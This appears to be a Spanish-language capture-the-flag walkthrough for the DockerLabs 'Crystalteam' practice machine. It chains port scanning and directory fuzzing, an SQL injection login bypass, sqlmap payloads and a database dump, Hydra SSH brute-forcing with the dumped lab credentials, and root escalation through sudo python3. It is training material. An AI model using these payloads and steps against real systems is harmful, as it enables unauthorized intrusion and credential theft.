---
icon: flag
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Crystalteam DockerLabs (Intermediate)

## Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip crystalteam.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_deploy.sh crystalteam.tar
```

Info:

```
                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-01 13:12 EDT
Nmap scan report for 172.17.0.2
Host is up (0.000029s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)
| ssh-hostkey: 
|   256 4f:8b:41:5d:91:db:c0:e6:56:f5:5c:2b:a2:48:c5:fb (ECDSA)
|_  256 e5:b9:e8:eb:16:8b:b9:bf:5e:e0:6f:12:00:ca:45:78 (ED25519)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.62 (Debian)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.86 seconds
```

Veremos que hay un puerto `80` en el que hay una pagina web alojada en el, si entramos dentro veremos un servidor de `apache2` por defecto, por lo que no veremos gran cosa, vamos a realizar un poco de `fuzzing` a ver que encontramos.

## Gobuster

```shell
gobuster dir -u http://<IP>/ -w <WORDLIST> -x html,php,txt -t 50 -k -r
```

Pero no veremos nada interesante, tirandome un par de horas, encontre una forma de realizar un `fuzzing` y tuve resultados, primero vamos a pasar el diccionario de `rockyou.txt` la primeras todas a mayusculas y despues limpiarlo de caracteres raros para que no nos de error al lanzar un `gobuster`:

```shell
awk '{print toupper(substr($0,1,1)) tolower(substr($0,2))}' /usr/share/wordlists/rockyou.txt > rockyou_capitalized.txt

grep -Ev '[^a-zA-Z0-9/_-]' rockyou_capitalized.txt > clean_wordlist.txt
```

Ahora vamos a realizar de nuevo la fuerza bruta:

```shell
gobuster dir -u http://<IP>/ -w clean_wordlist.txt -t 50 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                clean_wordlist.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
//////                (Status: 200) [Size: 10701]
///////               (Status: 200) [Size: 10701]
/////                 (Status: 200) [Size: 10701]
////////              (Status: 200) [Size: 10701]
//////////            (Status: 200) [Size: 10701]
/Certificacion        (Status: 200) [Size: 19091]
Progress: 6030927 / 13608807 (44.32%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 6043101 / 13608807 (44.41%)
===============================================================
Finished
===============================================================
```

Veremos que nos ha encontrado un directorio bastante interesante, en el que si entramos en el veremos lo siguiente:

<figure><img src="../../.gitbook/assets/image (363).png" alt=""><figcaption></figcaption></figure>

Veremos una pagina normal, pero tambien veremos un `login`, vamos a probar si en dicho `login` puede tener alguna vulnerabilidad de un `SQLInjection` poniendo lo siguiente tanto en el `usuario` como en la `password`:

```
User: ' OR 1=1-- -
Pass: ' OR 1=1-- -
```

Veremos que nos redirige al panel de control, no nos da ningun fallo, por lo que si es vulnerable a un `SQLi`, vamos abrir `BurpSuite` y capturar la peticion para poder exportarla en un `.txt` y asi utilizar la herramienta llamada `sqlmap`.

## sqlmap

Una vez capturada la peticion de `login` veremos algo asi:

> request.txt

```
POST /Certificacion/login.php HTTP/1.1
Host: 172.17.0.2
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 30
Origin: http://172.17.0.2
Connection: keep-alive
Referer: http://172.17.0.2/Certificacion/login.php
Cookie: PHPSESSID=829ddegtec2j7ce4da4bivovaj
Upgrade-Insecure-Requests: 1
Priority: u=0, i

usuario=admin&contrasena=admin
```

Ahora vamos a realizar el `SQLi` con dicho archivo:

```shell
sqlmap -r request.txt --dbs
```

Info:

```
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.9.2#stable}
|_ -| . [']     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 03:18:09 /2025-05-02/

[03:18:09] [INFO] parsing HTTP request from 'request.txt'
[03:18:09] [INFO] testing connection to the target URL
[03:18:09] [INFO] checking if the target is protected by some kind of WAF/IPS
[03:18:09] [INFO] testing if the target URL content is stable
[03:18:10] [INFO] target URL content is stable
[03:18:10] [INFO] testing if POST parameter 'usuario' is dynamic
[03:18:10] [WARNING] POST parameter 'usuario' does not appear to be dynamic
[03:18:10] [INFO] heuristic (basic) test shows that POST parameter 'usuario' might be injectable (possible DBMS: 'MySQL')
[03:18:10] [INFO] testing for SQL injection on POST parameter 'usuario'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] 

for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] 

[03:18:14] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[03:18:14] [WARNING] reflective value(s) found and filtering out
[03:18:14] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[03:18:14] [INFO] testing 'Generic inline queries'
[03:18:14] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[03:18:15] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
got a 302 redirect to 'http://172.17.0.2/Certificacion/curso.php'. Do you want to follow? [Y/n] 

redirect is a result of a POST request. Do you want to resend original POST data to a new location? [y/N] 

[03:18:17] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[03:18:17] [INFO] POST parameter 'usuario' appears to be 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)' injectable (with --string="Login")
[03:18:17] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[03:18:17] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[03:18:17] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[03:18:17] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[03:18:17] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[03:18:17] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[03:18:17] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[03:18:17] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[03:18:17] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[03:18:17] [INFO] POST parameter 'usuario' is 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable 
[03:18:17] [INFO] testing 'MySQL inline queries'
[03:18:17] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[03:18:17] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[03:18:17] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[03:18:17] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[03:18:17] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[03:18:17] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[03:18:17] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[03:18:27] [INFO] POST parameter 'usuario' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[03:18:27] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[03:18:27] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[03:18:27] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[03:18:27] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[03:18:27] [INFO] target URL appears to have 8 columns in query
do you want to (re)try to find proper UNION column types with fuzzy test? [y/N] 

injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] 

[03:18:32] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql') 
[03:18:32] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns'
[03:18:32] [INFO] testing 'MySQL UNION query (NULL) - 21 to 40 columns'
[03:18:32] [INFO] testing 'MySQL UNION query (random number) - 21 to 40 columns'
[03:18:32] [INFO] testing 'MySQL UNION query (NULL) - 41 to 60 columns'
[03:18:32] [INFO] testing 'MySQL UNION query (random number) - 41 to 60 columns'
[03:18:32] [INFO] testing 'MySQL UNION query (NULL) - 61 to 80 columns'
[03:18:32] [INFO] testing 'MySQL UNION query (random number) - 61 to 80 columns'
[03:18:32] [INFO] testing 'MySQL UNION query (NULL) - 81 to 100 columns'
[03:18:32] [INFO] testing 'MySQL UNION query (random number) - 81 to 100 columns'
[03:18:32] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
POST parameter 'usuario' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 

sqlmap identified the following injection point(s) with a total of 394 HTTP(s) requests:
---
Parameter: usuario (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: usuario=admin' OR NOT 6570=6570#&contrasena=admin

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: usuario=admin' AND (SELECT 3200 FROM(SELECT COUNT(*),CONCAT(0x716b787171,(SELECT (ELT(3200=3200,1))),0x7178787a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- lWVH&contrasena=admin

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: usuario=admin' AND (SELECT 6359 FROM (SELECT(SLEEP(5)))IGMS)-- ieYb&contrasena=admin
---
[03:18:34] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.62
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[03:18:34] [INFO] fetching database names
[03:18:34] [INFO] retrieved: 'information_schema'
[03:18:34] [INFO] retrieved: 'performance_schema'
[03:18:34] [INFO] retrieved: 'sys'
[03:18:34] [INFO] retrieved: 'mysql'
[03:18:34] [INFO] retrieved: 'inicio'
available databases [5]:
[*] information_schema
[*] inicio
[*] mysql
[*] performance_schema
[*] sys

[03:18:34] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/172.17.0.2'

[*] ending @ 03:18:34 /2025-05-02/
```

Veremos que ha funcionado, estamos viendo las `DDBBs` de dicho servidor por lo que vamos a investigar la llamada `inicio` ya que no es una por defecto.

```shell
sqlmap -r request.txt --batch -D inicio --threads 10 --tables
```

Info:

```
       ___
       __H__                                                                                                                                                 
 ___ ___[,]_____ ___ ___  {1.9.2#stable}                                                                                                                     
|_ -| . [,]     | .'| . |                                                                                                                                    
|___|_  [']_|_|_|__,|  _|                                                                                                                                    
      |_|V...       |_|   https://sqlmap.org                                                                                                                 

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 03:20:42 /2025-05-02/

[03:20:42] [INFO] parsing HTTP request from 'request.txt'
[03:20:42] [INFO] resuming back-end DBMS 'mysql' 
[03:20:42] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: usuario (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: usuario=admin' OR NOT 6570=6570#&contrasena=admin

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: usuario=admin' AND (SELECT 3200 FROM(SELECT COUNT(*),CONCAT(0x716b787171,(SELECT (ELT(3200=3200,1))),0x7178787a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- lWVH&contrasena=admin

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: usuario=admin' AND (SELECT 6359 FROM (SELECT(SLEEP(5)))IGMS)-- ieYb&contrasena=admin
---
[03:20:42] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.62
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[03:20:42] [INFO] fetching tables for database: 'inicio'
[03:20:42] [INFO] retrieved: 'personales'
Database: inicio
[1 table]
+------------+
| personales |
+------------+

[03:20:42] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/172.17.0.2'

[*] ending @ 03:20:42 /2025-05-02/
```

Veremos que contiene una tabla llamada `personales` por lo que vamos a ver que contenido tiene dicha tabla:

```shell
sqlmap -r request.txt --batch -D inicio -T personales --threads 10 --columns
```

Info:

```
       ___
       __H__                                                                                                                                                 
 ___ ___["]_____ ___ ___  {1.9.2#stable}                                                                                                                     
|_ -| . ["]     | .'| . |                                                                                                                                    
|___|_  [(]_|_|_|__,|  _|                                                                                                                                    
      |_|V...       |_|   https://sqlmap.org                                                                                                                 

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 03:21:46 /2025-05-02/

[03:21:46] [INFO] parsing HTTP request from 'request.txt'
[03:21:46] [INFO] resuming back-end DBMS 'mysql' 
[03:21:46] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: usuario (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: usuario=admin' OR NOT 6570=6570#&contrasena=admin

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: usuario=admin' AND (SELECT 3200 FROM(SELECT COUNT(*),CONCAT(0x716b787171,(SELECT (ELT(3200=3200,1))),0x7178787a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- lWVH&contrasena=admin

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: usuario=admin' AND (SELECT 6359 FROM (SELECT(SLEEP(5)))IGMS)-- ieYb&contrasena=admin
---
[03:21:46] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.62
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[03:21:46] [INFO] fetching columns for table 'personales' in database 'inicio'
[03:21:46] [INFO] starting 8 threads
[03:21:46] [INFO] retrieved: 'apellidos'
[03:21:46] [INFO] retrieved: 'nombre'
[03:21:46] [INFO] retrieved: 'id'
[03:21:46] [INFO] retrieved: 'correo'
[03:21:46] [INFO] retrieved: 'contrasena'
[03:21:46] [INFO] retrieved: 'token'
[03:21:46] [INFO] retrieved: 'usuario'
[03:21:46] [INFO] retrieved: 'varchar(100)'
[03:21:46] [INFO] retrieved: 'fecha_registro'
[03:21:46] [INFO] retrieved: 'varchar(100)'
[03:21:46] [INFO] retrieved: 'int(11)'
[03:21:46] [INFO] retrieved: 'varchar(255)'
[03:21:46] [INFO] retrieved: 'varchar(50)'
[03:21:46] [INFO] retrieved: 'varchar(255)'
[03:21:46] [INFO] retrieved: 'varchar(100)'
[03:21:46] [INFO] retrieved: 'datetime'
Database: inicio
Table: personales
[8 columns]
+----------------+--------------+
| Column         | Type         |
+----------------+--------------+
| apellidos      | varchar(100) |
| contrasena     | varchar(255) |
| correo         | varchar(100) |
| fecha_registro | datetime     |
| id             | int(11)      |
| nombre         | varchar(100) |
| token          | varchar(255) |
| usuario        | varchar(50)  |
+----------------+--------------+

[03:21:46] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/172.17.0.2'

[*] ending @ 03:21:46 /2025-05-02/
```

Veremos que se compone de esa estructura de tabla, por lo que ahora si vamos a ver que informacion contiene dicha tabla en cada una de sus columnas.

```shell
sqlmap -r request.txt --batch -D inicio -T personales --threads 10 --dump
```

Info:

```
        ___
       __H__                                                                                                                                                 
 ___ ___[,]_____ ___ ___  {1.9.2#stable}                                                                                                                     
|_ -| . [(]     | .'| . |                                                                                                                                    
|___|_  [.]_|_|_|__,|  _|                                                                                                                                    
      |_|V...       |_|   https://sqlmap.org                                                                                                                 

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 03:22:57 /2025-05-02/

[03:22:57] [INFO] parsing HTTP request from 'request.txt'
[03:22:57] [INFO] resuming back-end DBMS 'mysql' 
[03:22:57] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: usuario (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: usuario=admin' OR NOT 6570=6570#&contrasena=admin

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: usuario=admin' AND (SELECT 3200 FROM(SELECT COUNT(*),CONCAT(0x716b787171,(SELECT (ELT(3200=3200,1))),0x7178787a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- lWVH&contrasena=admin

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: usuario=admin' AND (SELECT 6359 FROM (SELECT(SLEEP(5)))IGMS)-- ieYb&contrasena=admin
---
[03:22:57] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.62
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[03:22:57] [INFO] fetching columns for table 'personales' in database 'inicio'
[03:22:57] [INFO] starting 8 threads
[03:22:57] [INFO] resumed: 'nombre'
[03:22:57] [INFO] resumed: 'id'
[03:22:57] [INFO] resumed: 'usuario'
[03:22:57] [INFO] resumed: 'apellidos'
[03:22:57] [INFO] resumed: 'varchar(100)'
[03:22:57] [INFO] resumed: 'correo'
[03:22:57] [INFO] resumed: 'int(11)'
[03:22:57] [INFO] resumed: 'varchar(50)'
[03:22:57] [INFO] resumed: 'token'
[03:22:57] [INFO] resumed: 'varchar(100)'
[03:22:57] [INFO] resumed: 'varchar(100)'
[03:22:57] [INFO] resumed: 'contrasena'
[03:22:57] [INFO] resumed: 'fecha_registro'
[03:22:57] [INFO] resumed: 'varchar(255)'
[03:22:57] [INFO] resumed: 'datetime'
[03:22:57] [INFO] resumed: 'varchar(255)'
[03:22:57] [INFO] fetching entries for table 'personales' in database 'inicio'
[03:22:57] [INFO] starting 3 threads
[03:22:57] [INFO] retrieved: 'root'
[03:22:57] [INFO] retrieved: 'Conexion'
[03:22:57] [INFO] retrieved: 'Mario'
[03:22:57] [INFO] retrieved: 'hanka'
[03:22:57] [INFO] retrieved: 'PI7Tmy'
[03:22:57] [INFO] retrieved: ''
[03:22:57] [INFO] retrieved: 'alejandro@example.com'
[03:22:57] [INFO] retrieved: 'root@example.com'
[03:22:57] [INFO] retrieved: 'hack@gmail.com'
[03:22:57] [INFO] retrieved: '2025-03-02 22:00:00'
[03:22:57] [INFO] retrieved: '2025-03-02 22:00:00'
[03:22:57] [INFO] retrieved: '2025-03-02 22:10:43'
[03:22:57] [INFO] retrieved: '2'
[03:22:57] [INFO] retrieved: '1'
[03:22:57] [INFO] retrieved: '3'
[03:22:57] [INFO] retrieved: 'root'
[03:22:57] [INFO] retrieved: 'Pinguino'
[03:22:57] [INFO] retrieved: 'Alejandro'
[03:22:57] [INFO] retrieved: '<token>'
[03:22:57] [INFO] retrieved: '<token>'
[03:22:57] [INFO] retrieved: 'root'
[03:22:57] [INFO] retrieved: '76620185902bc918eb2da82c489e31d6'
[03:22:57] [INFO] retrieved: 'alejandro'
[03:22:57] [INFO] retrieved: 'pinmar'
[03:22:57] [INFO] recognized possible password hashes in column 'token'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N
do you want to crack them via a dictionary-based attack? [Y/n/q] Y
[03:22:57] [INFO] using hash method 'md5_generic_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 1
[03:22:57] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] N
[03:22:57] [INFO] starting dictionary-based cracking (md5_generic_passwd)
[03:22:57] [INFO] starting 8 processes 
[03:23:00] [WARNING] no clear password(s) found                                                                                                             
Database: inicio
Table: personales
[3 entries]
+----+----------------------------------+-----------------------+-----------+-----------+-----------+------------+---------------------+
| id | token                            | correo                | nombre    | usuario   | apellidos | contrasena | fecha_registro      |
+----+----------------------------------+-----------------------+-----------+-----------+-----------+------------+---------------------+
| 1  | <token>                          | alejandro@example.com | Alejandro | alejandro | Conexion  | hanka      | 2025-03-02 22:00:00 |
| 2  | <token>                          | root@example.com      | root      | root      | root      | <blank>    | 2025-03-02 22:00:00 |
| 3  | 76620185902bc918eb2da82c489e31d6 | hack@gmail.com        | Pinguino  | pinmar    | Mario     | PI7Tmy     | 2025-03-02 22:10:43 |
+----+----------------------------------+-----------------------+-----------+-----------+-----------+------------+---------------------+

[03:23:00] [INFO] table 'inicio.personales' dumped to CSV file '/root/.local/share/sqlmap/output/172.17.0.2/dump/inicio/personales.csv'
[03:23:00] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/172.17.0.2'

[*] ending @ 03:23:00 /2025-05-02/
```

Veremos que hemos obtenido usuarios y contraseñas, por lo que nos vamos a crear un diccionario de cada uno de ellos y vamos a probar una fuerza bruta por `SSH` a ver si fueran algun algun usuario del sistema de casualidad.

## Escalate user alejandro

### Hydra

> users.txt

```
alejandro
root
pinmar
```

> pass.txt

```
hanka

PI7Tmy
```

```shell
hydra -L users.txt -P pass.txt ssh://<IP>/ -t 64 -I
```

Info:

```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-05-02 03:26:52
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 9 tasks per 1 server, overall 9 tasks, 9 login tries (l:3/p:3), ~1 try per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: alejandro   password: hanka
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-05-02 03:26:55
```

Veremos que hemos encontrado unas credenciales, por lo que nos vamos a conectar por `SSH` de la siguiente forma:

### SSH

```shell
ssh alejandro@<IP>
```

Metemos como contraseña `hanka` y veremos que estaremos dentro.

## Escalate Privileges

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for alejandro on 67c822d33bc9:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User alejandro may run the following commands on 67c822d33bc9:
    (ALL) NOPASSWD: /usr/bin/python3
```

Veremos que podremos ejecutar `python3` como el usuario `root` por lo que podremos hacer lo siguiente:

```shell
sudo python3 -c 'import os; os.system("/bin/bash")'
```

Info:

```
root@67c822d33bc9:/home/alejandro# whoami
root
```

Con esto veremos que ya seremos `root`, por lo que habremos terminado la maquina.
